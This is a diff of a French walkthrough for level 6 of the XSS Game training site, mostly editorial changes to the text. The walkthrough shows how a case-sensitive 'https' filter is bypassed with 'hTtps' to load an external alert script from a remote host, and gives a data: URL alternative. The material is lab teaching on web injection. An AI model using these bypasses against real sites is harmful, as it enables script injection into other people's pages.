@@ -64,7 +64,7 @@ Nous n'utiliserons pas Google mais ce payload: `https://payload.jh123x.com/alert
 ### MISSION
 
 Commençons par regarder les codes-sources, comme d'habitude.
-<br>Les fichiers `.py` et `js` ne nous apprennent rien d'utile, en revanche, le fichier `index.html` est un peu plus loquace, plus précisément, la ligne `23`:
+<br>Les fichiers `.py` et `js` ne nous apprennent rien d'utile, en revanche, le fichier `index.html` est un peu plus loquace, plus précisément, à partir de la ligne `20`:
 
 ```html
 1   <!doctype html>
@@ -93,7 +93,7 @@ Commençons par regarder les codes-sources, comme d'habitude.
 65  </html>
 ```
 
-Commentaire des développeurs:
+Commentaires des développeurs:
 
 ```
 // Cela nous empêchera totalement de charger des URL malveillantes !
@@ -109,11 +109,14 @@ Leur but est, manifestement, d'interdire toutes les adresses commençant par `ht
 
 Comme nous pouvons le voir, l'URL du payload est refusée.
 <br>Ce qui se veut être une bonne idée, sur le principe, MAIS... Une faille va nous permettre de contourner cette "sécurité".
+
 <br>En effet, ce système est sensible à la casse, ce qui signifie qu'il nous est possible de simplement mettre une lettre en majuscule, par exemple, `hTtps` pour que le playload fonctionne.
 
-<pre>
+```
 https://xss-game.appspot.com/level6/frame#hTtps://payload.jh123x.com/alert.js
-</pre>
+```
+
+<br>
 
 > [!IMPORTANT]
 > <pre>
@@ -127,14 +130,16 @@ https://xss-game.appspot.com/level6/frame#hTtps://payload.jh123x.com/alert.js
 <br>
 
 > [!TIP]
-> Une autre possibilité aurait été d'injecter un script JavaScript:
+> Une autre possibilité aurait été d'injecter une donnée URL:
 > ```javascript
 > data:text/plain,alert('ACCES AUTORISE !')
 > ```
 
-<pre>
+```
 https://xss-game.appspot.com/level6/frame#data:text/plain,alert('ACCES AUTORISE !')
-</pre>
+```
+
+<br>
 
 > [!IMPORTANT]
 > <pre>
